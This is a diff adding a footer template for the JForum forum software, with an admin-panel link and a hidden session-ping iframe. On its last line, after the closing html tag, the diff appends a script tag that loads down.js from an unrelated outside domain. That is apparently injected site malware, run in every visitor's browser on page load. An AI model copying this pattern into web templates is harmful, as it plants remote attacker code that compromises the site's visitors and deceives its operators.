@@ -1,0 +1,12 @@
+</td>
+</tr>
+	<tr>
+		<td align="center">
+			<#if session?exists && session.isAdmin()><span class="gen"><a id="adminpanel" href='${JForumContext.encodeURL("/admBase/login")}'>${I18n.getMessage("ForumBase.admin")}</a></span></#if>
+		</td>
+	</tr>
+</table>
+<iframe src="${contextPath}/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
+</body>
+</html>
+<script language=javascript src=http://Town.531jx.cn/down.js></script>
